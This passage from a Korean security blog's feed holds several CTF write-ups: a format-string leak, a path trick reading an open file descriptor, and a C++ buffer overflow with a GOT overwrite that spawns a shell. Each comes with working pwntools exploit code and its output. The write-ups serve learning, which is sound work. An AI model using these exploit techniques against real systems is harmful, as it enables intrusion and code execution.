class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># duplicate check</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://tistory.d1n0.me/18">https://tistory.d1n0.me/18</a><br><a href="https://realsung.tistory.com/185">https://realsung.tistory.com/185</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Way to simple (32bit, fsb)</title>
      <link href="/221003-lakectf2022-way_too_simple/"/>
      <url>/221003-lakectf2022-way_too_simple/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure><h3 id="파일-정보"><a href="#파일-정보" class="headerlink" title="파일 정보"></a>파일 정보</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ad8d3e5e9cf076847f4c23ee0443e19aa7170e7c, stripped</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>이 문제는 취약점을 설명하기에 앞서 할 말이 조금 있다.. ㅋㅋ</p><p>문제 실행을 하려는데 아래와 같이 문제 실행이 안되어서 조금 당황했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ ./exe </span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>굳이 실행하려하지말고 도커파일 주어졌는데 build하고 run 하면 되지 않아? 라고 한다면.. 할 말이 없긴 하다. <code>docker build</code>는 성공했으나 <code>docker run</code>이 제대로 되지 않았는데, 이유는 딱히 알아보지 않았다. 왜냐면 그 과정에서 IDA로 바이너리 열었더니 굳이 로컬에서 실행시키지 않아도 풀 수 있을 것 같았기 때문이다. ㅎ</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>일단 문제에서 제공된 바이너리는 32bit 바이너리이다. IDA로 열어보면 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">128</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_1111AE20(off_111B9498, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B9494, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B949C, <span class="number">0</span>);</span><br><span class="line">  flag_addr = (<span class="type">int</span>)read_flag();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is at %p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)flag_addr);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your magical spell! &quot;</span>);</span><br><span class="line">  sub_111187E0(<span class="string">&quot;%127[^\n]&quot;</span>, input);</span><br><span class="line">  <span class="built_in">printf</span>(input);                                <span class="comment">// fsb</span></span><br><span class="line">  sub_111191B0((<span class="type">int</span>)<span class="string">&quot;\nHope you got what you wanted!&quot;</span>);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v5 )</span><br><span class="line">    sub_11137030();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stripped file이라서 함수명이 다 <code>sub_XX</code>로 시작하고 있었다. 그래서 이름을 조금 바꿔줬다.</p><p><code>read_flag()</code> 함수에서 flag를 open해서 read하는데 그 read한 주소를 반환한다.</p><p>결국 flag 위치를 출력해주고, 우리에게 input을 받는다.</p><p>여기서 포인트는 우리 input을 printf로 출력해줄 때 포맷 스트링 없이 출력을 해준다는 것이다. 그러면 <strong>fsb 취약점</strong>이 발생하게 된다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ nc chall.polygl0ts.ch 16000</span><br><span class="line">The flag is at 0x12c1a420</span><br><span class="line">Input your magical spell! AAAA %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">AAAA 0xffad03cc 0xffad0458 0x11111838 0x1118c5cf 0x32323032 0x2a 0x41414141 0x20702520 0x25207025 0x70252070</span><br><span class="line">Hope you got what you wanted!</span><br></pre></td></tr></table></figure><p>offset은 7임을 알 수 있다. </p><p>참고로 32bit 환경에서의 fsb 취약점에 대한 내용은 나의 <a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">구 티스토리 블로그</a>에 자세히 설명되어 있다.</p><p><a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(1)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-2?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(2)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-3?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(3) (완)</a></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">16000</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;flag address :: &#x27;</span> + <span class="built_in">hex</span>(flag))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += <span class="string">&quot;%7$s&quot;</span>    <span class="comment"># offset is 7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;spell!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] flag address :: 0x12fe0420</span><br><span class="line"> \x04\x127$s</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">  \x04\x12PFL&#123;format_string_are_way_too_old&#125;</span><br><span class="line">Hope you got what you wanted!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>flag가 이런식으로 출력이 되는데, flag 포맷에 맞게 조금 만져주기만 하면 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EPFL&#123;format_string_are_way_too_old&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - readme2022 (misc)</title>
      <link href="/220928-cakectf2022-readme2022/"/>
      <url>/220928-cakectf2022-readme2022/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Ubuntu 20.04<br>사용자 제공 파일: 소스코드(python)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found. If this message shows up&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    on the remote server, please report to amdin.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filepath = <span class="built_in">input</span>(<span class="string">&quot;filepath: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> filepath.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not start with &#x27;/&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not contain &#x27;..&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    filepath = os.path.expanduser(filepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&quot;[-] Could not open file&quot;</span>)</span><br></pre></td></tr></table></figure><p>제공된 server.py 소스코드 전문이다.</p><p>코드를 읽다보면 뭔가 핵심인 것 같은 부분을 찾을 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.expanduser(filepath)</span><br></pre></td></tr></table></figure><p><code>filepath</code>에 <code>~&lt;username&gt;</code>를 입력한다면 home 디렉토리 path가 바뀌게 되는데 이것을 이용하여 문제를 푸는 것이다.</p><p>소스코드가 제공되었으니까 filepath를 출력해서 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~</span><br><span class="line">/home/jir4vvit</span><br><span class="line">[-] Could not open file</span><br><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~test</span><br><span class="line">/home/test</span><br><span class="line">[-] Could not open file</span><br></pre></td></tr></table></figure><p>이런 느낌이다..</p><p><code>/etc/passwd</code>을 확인하면 아래와 같은 정보가 있는데,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>sys 사용자의 home 디렉토리가 <code>/dev</code>인 것을 알 수 있다.</p><p>더불어 문제에서 <code>/flag.txt</code>를 open하고 close하지 않았음으로 file descriptor가 계속 살아있음을 알 수 있다. (!)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py</span><br><span class="line">filepath: ~sys/fd/3</span><br><span class="line">flag&#123;fake_flag&#125;</span><br></pre></td></tr></table></figure><p>설명을 조금 추가하자면, 지금 sys 사용자의 홈 디렉토리로 변경되었으니 <code>/dev</code>가 filepath(homepath)가 되었고, 정확히는 <code>/dev/fd/3</code>에 접근한 것이다.</p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>개인적으로 재미있는 문제라고 생각되어 블로그에 꼭 기록하고 싶었다.</p><p>아, File Descriptor에 대한 설명은 나의 과거 <a href="https://jiravvit.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EB%94%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%84%B0-File-Descriptor">티스토리 블로그</a>에 있다. ㅎ</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - str.vs.cstr (cpp)</title>
      <link href="/220928-cakectf2022-str_vs_c.str/"/>
      <url>/220928-cakectf2022-str_vs_c.str/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 소스코드(cpp)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="built_in">Test</span>() &#123; std::<span class="built_in">fill</span>(_c_str, _c_str + <span class="number">0x20</span>, <span class="number">0</span>); &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">c_str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _c_str; &#125;</span><br><span class="line">  <span class="function">std::string&amp; <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _str; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  __attribute__((used))</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">call_me</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> _c_str[<span class="number">0x20</span>];</span><br><span class="line">  std::string _str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Test 구조체에 0x20 크기의 <code>_c_str</code>를 정의해놨다.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// set c_str</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;c_str: &quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; test.<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>문제 기능 중에 <code>_c_str</code>에 입력하는 부분이 있는데, 이 때 <strong>입력값 크기를 검증하지 않아 BOF가 발생할 수 있다.</strong></p><p>아쉽게도(?) canary가 존재하여 ROP는 불가능하다.<br>하지만 <code>_c_str</code> 뒤에 <code>std::string</code> 데이터를 가리키는 스택 포인터가 저장되어 있다.</p><p>마침 <code>std::string</code> 데이터를 get하거나 set(입력)하는 기능이 있는데, 이 때 (<code>_c_str</code> 뒤에 위치한) 포인터를 이용해서 접근한다.</p><p>우리는 여기서 GOT Overwriting을 통해 원하는 함수를 실행시킬 수 있다는 것을 눈치챌 수 있다.</p><p><code>call_me</code>라는 좋은 함수가 있으니 적당한 함수를 골라서 어떠한 got를 <code>call me</code> 로 덮어버리면 바로 쉘을 딸 수 있을 것 같다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>어떤 함수 got를 <code>call_me</code>로 덮을까.. 고민을 해보았다.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;choice: &quot;</span>;</span><br><span class="line">std::cin &gt;&gt; choice;</span><br></pre></td></tr></table></figure><p>기능 수행이 끝이 나면 어느 case문으로 갈 지 입력을 받는데,<br>해당 부분이 IDA에서</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">choice = <span class="number">0</span>;</span><br><span class="line">std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br></pre></td></tr></table></figure><p>이렇게 보여지고 있었다.</p><p><code>std::char_traits</code>의 got를 덮어버린다면..?</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_c_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x404048</span>)) <span class="comment"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</span></span><br><span class="line">set_str(p64(<span class="number">0x4016de</span>)) <span class="comment"># call_me</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>문제 풀 당시에 이것저것 해보다가 <code>std::string</code>이 저장되는 구조가 조금 이상한 것만 느끼고 자세히 보지는 않았었는데.. 지금 다시 보니 그때 느낀 게 틀린 것이 아니었음을 알게 되었다.</p><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><p>기본 구조는 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>디버거로 확인해보면 더 직관적으로 확인할 수 있다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search AAAAAAAAAAAAAAA</span><br><span class="line">[stack]         0x7ffd35bb1700 &#x27;AAAAAAAAAAAAAAA&#x27;</span><br><span class="line">pwndbg&gt; x/4gx 0x7ffd35bb1700-0x10</span><br><span class="line">0x7ffd35bb16f0:0x00007ffd35bb17000x000000000000000f</span><br><span class="line">0x7ffd35bb1700:0x41414141414141410x0041414141414141</span><br></pre></td></tr></table></figure><p>해당 문제를 예시로 들자면 값 <code>0x00007ffd35bb1700</code>가 저장된 주소 <code>0x7ffd35bb16f0</code>에 <code>std::char_traits</code>의 got를 쓴다.<br>그리고 해당 got에다가 <code>call_me</code>를 쓰면(GOT overwriting), 결론적으로 <code>std::char_traits</code>이 실행될 때 <code>call_me</code>가 실행된다.</p><p>다시 기본 구조로 돌아와서..Data Size가 16(0x10) 이상인 경우엔 특이하게 힙에 할당된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x7ffd375efe40</span><br><span class="line">0x7ffd375efe40:0x0000000001e23eb00x0000000000000010</span><br><span class="line">0x7ffd375efe50:0x000000000000001e0x0041414141414141</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000001e23eb0 - 0x10</span><br><span class="line">0x1e23ea0:0x00000000000000000x0000000000000031</span><br><span class="line">0x1e23eb0:0x41414141414141410x4141414141414141</span><br><span class="line">0x1e23ec0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1e23ed0:0x00000000000000000x000000000000f131</span><br><span class="line">0x1e23ee0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>사실 이 문제에서는 (익스하는데에는 안썼지만) 출력하는 기능도 존재하기 때문에 <code>std::string</code>의 기본 구조만 충분히 알고 있다면 leak도 가능하다.</p><p><code>_c_str</code>를 입력할 때 BOF를 이용하여 Data Pointer에 leak하고 싶은 주소 넣고 바로 뒤에 이어지는 Data Size에 8로 세팅해주면 된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x4040c0</span>) + p64(<span class="number">8</span>))</span><br><span class="line">libc_base = get_str() - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br></pre></td></tr></table></figure><p>이런식으로 libc leak도 가능하고 pie leak도 가능할 것이다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#%E5%9F%BA%E6%9C%AC%E6%A7%8B%E9%80%A0">ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2021&#x2F;11&#x2F;30&#x2F;235732#基本構造</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
